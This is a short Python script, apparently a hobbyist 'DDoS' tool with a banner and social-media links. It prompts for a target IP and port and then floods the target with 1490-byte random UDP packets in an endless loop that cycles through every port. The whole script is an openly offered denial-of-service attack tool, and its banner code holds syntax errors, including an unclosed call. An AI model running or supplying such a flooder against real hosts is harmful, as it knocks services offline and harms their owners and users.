import sys
import os
import time
import socket
import random
import colorama
from colorama import Fore, Style
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear"
print (Fore.GREEN + " ___  ___  ___  ___") 
print ("             | . \| . \| . |/ __>")
print ("             | | || | || | |\__ \")
print ("             |___/|___/`___|<___/")
      
print "                 Created by: Mr_x"
print "     Github: https://github.com/official-hack4peace"
print "     YouTube: https://youtube.com/channel/UCHTT9mz7Fdtn3TdotMjynGg"
print "     Instagram: https://instagram.com/official_hack4peace01"
ip = raw_input(Fore.RED + "Target IP: ")
port = input("Port: ")
# starting ddos attack
print "DDOS ATTACK STARTED"
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
